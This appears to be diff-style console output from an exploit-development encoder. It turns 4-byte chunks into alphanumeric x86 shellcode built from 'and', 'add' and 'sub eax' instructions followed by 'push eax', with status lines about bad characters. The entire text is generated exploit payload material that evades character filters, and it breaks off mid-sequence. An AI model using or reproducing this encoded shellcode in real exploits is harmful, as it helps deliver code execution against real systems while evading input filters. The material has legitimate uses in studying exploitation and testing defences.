+[[94m*[0m] Encoding [6c364b6c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x26\x23\x36[0m" ## add  eax, 0x36232636
+shellcode += "[37m\x05\x36\x25\x13\x36[0m" ## add  eax, 0x36132536
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [76514349]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x22\x31\x33[0m" ## add  eax, 0x33312225
+shellcode += "[37m\x05\x24\x21\x20\x43[0m" ## add  eax, 0x43202124
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [71673461]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x22\x33\x31[0m" ## add  eax, 0x31332231
+shellcode += "[37m\x05\x30\x12\x34\x40[0m" ## add  eax, 0x40341230
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [38366b6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x36\x23\x24[0m" ## add  eax, 0x24233637
+shellcode += "[37m\x05\x37\x35\x13\x14[0m" ## add  eax, 0x14133537
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [58507449]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x32\x30\x34[0m" ## add  eax, 0x34303225
+shellcode += "[37m\x05\x24\x42\x20\x24[0m" ## add  eax, 0x24204224
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [35447445]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x32\x22\x23[0m" ## add  eax, 0x23223223
+shellcode += "[37m\x05\x22\x42\x22\x12[0m" ## add  eax, 0x12224222
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4d634b57]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x26\x32\x27[0m" ## add  eax, 0x27322633
+shellcode += "[37m\x05\x24\x25\x31\x26[0m" ## add  eax, 0x26312524
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [584a6d51]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x37\x25\x34[0m" ## add  eax, 0x34253731
+shellcode += "[37m\x05\x20\x36\x25\x24[0m" ## add  eax, 0x24253620
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4374567a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x33\x32\x22[0m" ## add  eax, 0x22323335
+shellcode += "[37m\x05\x45\x23\x42\x21[0m" ## add  eax, 0x21422345
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [45537049]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x30\x32\x23[0m" ## add  eax, 0x23323025
+shellcode += "[37m\x05\x24\x40\x21\x22[0m" ## add  eax, 0x22214024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6845376f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x24\x33\x34[0m" ## add  eax, 0x34332437
+shellcode += "[37m\x05\x36\x23\x23\x34[0m" ## add  eax, 0x34232336
+shellcode += "[37m\x05\x35\x23\x22\x33[0m" ## add  eax, 0x33222335
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [71576d66]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x37\x33\x31[0m" ## add  eax, 0x31333733
+shellcode += "[37m\x05\x33\x36\x24\x40[0m" ## add  eax, 0x40243633
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f585179]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x44\x31\x34\x37[0m" ## add  eax, 0x37343144
+shellcode += "[37m\x05\x34\x32\x34\x26[0m" ## add  eax, 0x26343234
+shellcode += "[37m\x05\x34\x21\x23\x25[0m" ## add  eax, 0x25232134
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c6c4f6b]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x37\x36\x36[0m" ## add  eax, 0x36363736
+shellcode += "[37m\x05\x35\x26\x35\x35[0m" ## add  eax, 0x35352635
+shellcode += "[37m\x05\x33\x25\x34\x34[0m" ## add  eax, 0x34342533
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [51365678]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x33\x23\x31[0m" ## add  eax, 0x31233334
+shellcode += "[37m\x05\x44\x23\x13\x20[0m" ## add  eax, 0x20132344
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [71776b6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x36\x33\x31[0m" ## add  eax, 0x31333637
+shellcode += "[37m\x05\x37\x35\x44\x40[0m" ## add  eax, 0x40443537
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [64656b6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x36\x33\x32[0m" ## add  eax, 0x32333637
+shellcode += "[37m\x05\x37\x35\x32\x32[0m" ## add  eax, 0x32323537
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [79637a34]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x35\x32\x35[0m" ## add  eax, 0x35323522
+shellcode += "[37m\x05\x12\x45\x31\x44[0m" ## add  eax, 0x44314512
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [63485864]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x34\x24\x32[0m" ## add  eax, 0x32243432
+shellcode += "[37m\x05\x32\x24\x24\x31[0m" ## add  eax, 0x31242432
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [49304b6c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x26\x20\x25[0m" ## add  eax, 0x25202636
+shellcode += "[37m\x05\x36\x25\x10\x24[0m" ## add  eax, 0x24102536
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [53786176]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x31\x34\x32[0m" ## add  eax, 0x32343133
+shellcode += "[37m\x05\x43\x30\x44\x21[0m" ## add  eax, 0x21443043
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30513936]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x25\x31\x20[0m" ## add  eax, 0x20312523
+shellcode += "[37m\x05\x13\x14\x20\x10[0m" ## add  eax, 0x10201413
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4b4c6173]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x31\x26\x26[0m" ## add  eax, 0x26263132
+shellcode += "[37m\x05\x41\x30\x26\x25[0m" ## add  eax, 0x25263041
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [714a5165]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x31\x25\x31[0m" ## add  eax, 0x31253133
+shellcode += "[37m\x05\x32\x20\x25\x40[0m" ## add  eax, 0x40252032
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [5861336d]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x22\x31\x34[0m" ## add  eax, 0x34312237
+shellcode += "[37m\x05\x36\x11\x30\x24[0m" ## add  eax, 0x24301136
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [48633162]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x21\x32\x24[0m" ## add  eax, 0x24322131
+shellcode += "[37m\x05\x31\x10\x31\x24[0m" ## add  eax, 0x24311031
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c526b6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x36\x31\x36[0m" ## add  eax, 0x36313637
+shellcode += "[37m\x05\x37\x35\x21\x36[0m" ## add  eax, 0x36213537
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c357a73]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x35\x23\x36[0m" ## add  eax, 0x36233532
+shellcode += "[37m\x05\x41\x45\x12\x36[0m" ## add  eax, 0x36124541
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4b4c7076]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x30\x26\x26[0m" ## add  eax, 0x26263033
+shellcode += "[37m\x05\x43\x40\x26\x25[0m" ## add  eax, 0x25264043
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [42314b4c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x26\x21\x21[0m" ## add  eax, 0x21212626
+shellcode += "[37m\x05\x26\x25\x10\x21[0m" ## add  eax, 0x21102526
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [37764231]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x21\x33\x23[0m" ## add  eax, 0x23332121
+shellcode += "[37m\x05\x10\x21\x43\x14[0m" ## add  eax, 0x14432110
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6259425a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x21\x35\x31[0m" ## add  eax, 0x31352135
+shellcode += "[37m\x05\x25\x21\x24\x31[0m" ## add  eax, 0x31242125
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [57496146]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x31\x25\x33[0m" ## add  eax, 0x33253123
+shellcode += "[37m\x05\x23\x30\x24\x24[0m" ## add  eax, 0x24243023
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4d746f5a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x37\x43\x36[0m" ## add  eax, 0x36433735
+shellcode += "[37m\x05\x34\x36\x32\x26[0m" ## add  eax, 0x26323634
+shellcode += "[37m\x05\x24\x35\x32\x24[0m" ## add  eax, 0x24323524
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [617a5037]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x30\x35\x31[0m" ## add  eax, 0x31353023
+shellcode += "[37m\x05\x14\x20\x45\x30[0m" ## add  eax, 0x30452014
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c647237]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x31\x32\x36[0m" ## add  eax, 0x36323123
+shellcode += "[37m\x05\x14\x41\x32\x36[0m" ## add  eax, 0x36324114
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c316150]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x31\x21\x36[0m" ## add  eax, 0x36213130
+shellcode += "[37m\x05\x20\x30\x10\x36[0m" ## add  eax, 0x36103020
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4c374c6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x26\x23\x26[0m" ## add  eax, 0x26232637
+shellcode += "[37m\x05\x37\x26\x14\x26[0m" ## add  eax, 0x26142637
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6f593150]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x21\x34\x37[0m" ## add  eax, 0x37342131
+shellcode += "[37m\x05\x31\x22\x34\x36[0m" ## add  eax, 0x36342231
+shellcode += "[37m\x05\x21\x21\x24\x35[0m" ## add  eax, 0x35242121
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [56376a42]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x35\x23\x33[0m" ## add  eax, 0x33233521
+shellcode += "[37m\x05\x21\x35\x14\x23[0m" ## add  eax, 0x23143521
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [576e6f56]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x37\x36\x34[0m" ## add  eax, 0x34363733
+shellcode += "[37m\x05\x33\x36\x35\x33[0m" ## add  eax, 0x33353633
+shellcode += "[37m\x05\x23\x35\x36\x23[0m" ## add  eax, 0x23363523
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [58773274]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x21\x33\x34[0m" ## add  eax, 0x34332132
+shellcode += "[37m\x05\x42\x11\x44\x24[0m" ## add  eax, 0x24441142
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6b6e5434]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x32\x37\x36[0m" ## add  eax, 0x36373222
+shellcode += "[37m\x05\x12\x22\x37\x35[0m" ## add  eax, 0x35372212
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [62434b4c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x26\x22\x31[0m" ## add  eax, 0x31222626
+shellcode += "[37m\x05\x26\x25\x21\x31[0m" ## add  eax, 0x31212526
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c465250]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x31\x23\x36[0m" ## add  eax, 0x36233130
+shellcode += "[37m\x05\x20\x21\x23\x36[0m" ## add  eax, 0x36232120
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6b6e5046]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x30\x37\x36[0m" ## add  eax, 0x36373023
+shellcode += "[37m\x05\x23\x20\x37\x35[0m" ## add  eax, 0x35372023
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30566b4e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x27\x36\x33\x20[0m" ## add  eax, 0x20333627
+shellcode += "[37m\x05\x27\x35\x23\x10[0m" ## add  eax, 0x10233527
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [64305049]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x30\x20\x32[0m" ## add  eax, 0x32203025
+shellcode += "[37m\x05\x24\x20\x10\x32[0m" ## add  eax, 0x32102024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [51366568]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x33\x23\x31[0m" ## add  eax, 0x31233334
+shellcode += "[37m\x05\x34\x32\x13\x20[0m" ## add  eax, 0x20133234
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [394b5043]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x30\x26\x25[0m" ## add  eax, 0x25263022
+shellcode += "[37m\x05\x21\x20\x25\x14[0m" ## add  eax, 0x14252021
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30637057]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x30\x32\x20[0m" ## add  eax, 0x20323033
+shellcode += "[37m\x05\x24\x40\x31\x10[0m" ## add  eax, 0x10314024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [3073326b]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x21\x32\x20[0m" ## add  eax, 0x20322136
+shellcode += "[37m\x05\x35\x11\x41\x10[0m" ## add  eax, 0x10411135
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [68384c4b]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x26\x24\x34[0m" ## add  eax, 0x34242626
+shellcode += "[37m\x05\x25\x26\x14\x34[0m" ## add  eax, 0x34142625
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [494a7542]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x33\x25\x25[0m" ## add  eax, 0x25253321
+shellcode += "[37m\x05\x21\x42\x25\x24[0m" ## add  eax, 0x24254221
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [41385058]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x30\x24\x21[0m" ## add  eax, 0x21243034
+shellcode += "[37m\x05\x24\x20\x14\x20[0m" ## add  eax, 0x20142024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [42414242]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x21\x21\x21[0m" ## add  eax, 0x21212121
+shellcode += "[37m\x05\x21\x21\x20\x21[0m" ## add  eax, 0x21202121
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30424232]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x21\x21\x20[0m" ## add  eax, 0x20212121
+shellcode += "[37m\x05\x11\x21\x21\x10[0m" ## add  eax, 0x10212111
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [42413251]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x21\x21\x21[0m" ## add  eax, 0x21212131
